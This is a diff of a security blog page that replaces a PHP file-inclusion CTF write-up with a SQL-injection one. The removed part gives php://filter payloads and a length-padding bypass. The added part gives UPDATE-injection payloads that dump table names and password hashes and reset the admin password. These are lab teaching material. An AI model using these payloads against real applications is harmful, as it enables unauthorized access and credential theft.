@@ -6,19 +6,18 @@
   <meta http-equiv="cache-control" content="no-cache">
   <meta http-equiv="expires" content="0">
   
-  <title>鹏城杯2022-简单包含-wp | Antel0p3&#39;s blog</title>
+  <title>HUBUCTF2022-ezsql-wp | Antel0p3&#39;s blog</title>
   <meta name="author" content="John Doe">
   
-  <meta name="description" content="题目链接   
-页面源码1234&amp;lt;?php highlight_file(__FILE__);include($_POST[&amp;quot;flag&amp;quot;]);//flag in /var/www/html/flag.php;
-
-exp伪协议查看flag发现被过滤
-1?flag=php://">
+  <meta name="description" content="题目链接
+题目描述：好想知道admin的密码呜呜呜~
+UPDATE注入注册登入发现可以更新个人信息   其中age字段存在update注入
+123451. nickname=hhh&amp;amp;age=23, description=(select 1)%23	// 12. nickname=hhh&amp;a">
   
   
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 
-  <meta property="og:title" content="鹏城杯2022-简单包含-wp"/>
+  <meta property="og:title" content="HUBUCTF2022-ezsql-wp"/>
   <meta property="og:site_name" content="Antel0p3&#39;s blog"/>
 
   
@@ -115,13 +114,13 @@ exp伪协议查看flag发现被过滤
 								<h1>
 									
 											
-												鹏城杯2022-简单包含-wp
+												HUBUCTF2022-ezsql-wp
 									
 									
 								</h1>
 								
-									<p id="/2023/07/11/%E9%B9%8F%E5%9F%8E%E6%9D%AF2022-%E7%AE%80%E5%8D%95%E5%8C%85%E5%90%AB-wp/" class="leancloud-visitors view"
-										data-flag-title="鹏城杯2022-简单包含-wp">
+									<p id="/2023/07/13/HUBUCTF2022-ezsql-wp/" class="leancloud-visitors view"
+										data-flag-title="HUBUCTF2022-ezsql-wp">
 										<i class="fa fa-eye"></i> <i class="leancloud-visitors-count"></i>
 									</p>
 									
@@ -142,17 +141,17 @@ exp伪协议查看flag发现被过滤
 	<div class="mypage">		
 	  		
 
-	  <p><a target="_blank" rel="noopener" href="https://www.nssctf.cn/problem/2422">题目链接</a>   </p>
-<h2 id="页面源码"><a href="#页面源码" class="headerlink" title="页面源码"></a>页面源码</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="variable">$_POST</span>[<span class="string">&quot;flag&quot;</span>]);</span><br><span class="line"><span class="comment">//flag in /var/www/html/flag.php;</span></span><br></pre></td></tr></table></figure>
+	  <p><a target="_blank" rel="noopener" href="https://www.nssctf.cn/problem/2603">题目链接</a></p>
+<p>题目描述：好想知道admin的密码呜呜呜~</p>
+<h2 id="UPDATE注入"><a href="#UPDATE注入" class="headerlink" title="UPDATE注入"></a>UPDATE注入</h2><p>注册登入发现可以更新个人信息   其中age字段存在update注入</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>. nickname=hhh&amp;age=<span class="number">23</span>, description=(select <span class="number">1</span>)%<span class="number">23</span>	<span class="comment">// 1</span></span><br><span class="line"><span class="number">2</span>. nickname=hhh&amp;age=<span class="number">23</span>, description=(select <span class="title function_ invoke__">database</span>())%<span class="number">23</span>	<span class="comment">// 查看数据库   demo2</span></span><br><span class="line"><span class="number">3</span>. nickname=hhh&amp;age=<span class="number">23</span>, description=(select <span class="title function_ invoke__">group_concat</span>(table_name) <span class="keyword">from</span> information_schema.tables where table_schema=<span class="title function_ invoke__">database</span>())%<span class="number">23</span>	<span class="comment">//查看表 users</span></span><br><span class="line"><span class="number">4</span>. nickname=hhh&amp;age=<span class="number">23</span>, description=(select <span class="title function_ invoke__">group_concat</span>(column_name) <span class="keyword">from</span> information_schema.columns where table_name=<span class="number">0x7573657273</span>)%<span class="number">23</span>    <span class="comment">//查看列 id,username,password,nickname,age,description		（注意此处users会导致更新错误 替换为url编码）</span></span><br><span class="line"><span class="number">5</span>. nickname=hhh&amp;age=<span class="number">23</span>, description=(select <span class="title function_ invoke__">group_concat</span>(password) users)%<span class="number">23</span>	<span class="comment">// 0cc175b9c0f1b6a831c399e269772661 为md5格式</span></span><br></pre></td></tr></table></figure>
 
-<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><h3 id="伪协议查看flag"><a href="#伪协议查看flag" class="headerlink" title="伪协议查看flag"></a>伪协议查看flag</h3><p>发现被过滤</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?flag=php:<span class="comment">//filter/convert.base64-encode/resource=flag.php</span></span><br></pre></td></tr></table></figure>
+<h3 id="修改password"><a href="#修改password" class="headerlink" title="修改password"></a>修改password</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">6</span>. nickname=hhh&amp;age=<span class="number">23</span>, password=<span class="number">0x3230326362393632616335393037356239363462303731353264323334623730</span>%<span class="number">23</span> <span class="comment">// 0x32...30 == hex(md5(&#x27;123&#x27;))</span></span><br></pre></td></tr></table></figure>
 
-<h3 id="查看index源码"><a href="#查看index源码" class="headerlink" title="查看index源码"></a>查看index源码</h3><p>当输入长度小于800时 过滤flag</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ?flag=php://filter/convert.base64-encode/resource=index.php</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$path</span> = <span class="variable">$_POST</span>[<span class="string">&quot;flag&quot;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">strlen</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>)) &lt; <span class="number">800</span> &amp;&amp; <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/flag/&#x27;</span>, <span class="variable">$path</span>)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;nssctf waf!&#x27;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    @<span class="keyword">include</span>(<span class="variable">$path</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<h3 id="最后发送字符数-gt-800-然后查看flag"><a href="#最后发送字符数-gt-800-然后查看flag" class="headerlink" title="最后发送字符数&gt;800 然后查看flag"></a>最后发送字符数&gt;800 然后查看flag</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&amp;flag=php:<span class="comment">//filter/convert.base64-encode/resource=flag.php</span></span><br></pre></td></tr></table></figure>
-
+<h3 id="登录成功"><a href="#登录成功" class="headerlink" title="登录成功"></a>登录成功</h3><p>username: admin password: 123</p>
+<p>这里description是被覆盖过的，因为前面执行 [5] 的时候是对所有用户进行操作，使得description为password</p>
+<p>可以看到description: 5a64edabc9358c603103053a3c600a88 爆破可得原始密码为 <code>iamcool</code> </p>
+<p> 需要重开环境直接  1.修改密码[6]再登录 2.iamcool登录</p>
 
 	  <div class="article-footer-copyright">
 
@@ -162,7 +161,7 @@ exp伪协议查看flag发现被过滤
 	</div>
 
 	<!-- 
-		<span id="/2023/07/11/%E9%B9%8F%E5%9F%8E%E6%9D%AF2022-%E7%AE%80%E5%8D%95%E5%8C%85%E5%90%AB-wp/" class="leancloud-visitors view" data-flag-title="鹏城杯2022-简单包含-wp">
+		<span id="/2023/07/13/HUBUCTF2022-ezsql-wp/" class="leancloud-visitors view" data-flag-title="HUBUCTF2022-ezsql-wp">
 			<i class="fa fa-eye"></i> <i class="leancloud-visitors-count"></i>
 		</span>
 	 -->
@@ -174,13 +173,12 @@ exp伪协议查看flag发现被过滤
 
     
     
-    <a href="/2023/07/11/SWPUCTF2022-ezsql-wp/" type="button" class="btn btn-default"><i
-                class="fa fa-arrow-circle-o-left"></i> Prev</a>
+    <a type="button" class="btn btn-default disabled"><i class="fa fa-arrow-circle-o-left"></i>Prev</a>
     
 
     <a href="/" type="button" class="btn btn-default"><i class="fa fa-home"></i>Home</a>
     
-    <a href="/2023/07/11/SWPUCTF2022-ezezphp-wp/" type="button" class="btn btn-default ">Next<i
+    <a href="/2023/07/12/第五空间2021-yasqlin-wp/" type="button" class="btn btn-default ">Next<i
                 class="fa fa-arrow-circle-o-right"></i></a>
     
 
@@ -239,7 +237,7 @@ new Valine(valineConfig);
 	
 	<div class="meta-widget">
 	<i class="fa fa-clock-o"></i>
-	2023-07-11 
+	2023-07-13 
 	</div>
 	
 
@@ -263,7 +261,7 @@ new Valine(valineConfig);
 	<a data-toggle="collapse" data-target="#tags"><i class="fa fa-tags"></i></a>		  
     <ul id="tags" class="tag_box list-unstyled collapse in">	  
 	    
-  <li><a href="/tags/CTF/">CTF<span>29</span></a></li> <li><a href="/tags/nssctf/">nssctf<span>23</span></a></li> <li><a href="/tags/web/">web<span>16</span></a></li> <li><a href="/tags/php/">php<span>10</span></a></li> <li><a href="/tags/include/">include<span>1</span></a></li> <li><a href="/tags/鹏城杯2022/">鹏城杯2022<span>1</span></a></li>
+  <li><a href="/tags/CTF/">CTF<span>29</span></a></li> <li><a href="/tags/nssctf/">nssctf<span>23</span></a></li> <li><a href="/tags/web/">web<span>16</span></a></li> <li><a href="/tags/sql/">sql<span>5</span></a></li> <li><a href="/tags/HUBUCTF2022/">HUBUCTF2022<span>1</span></a></li>
     </ul>
 	</div>
 		
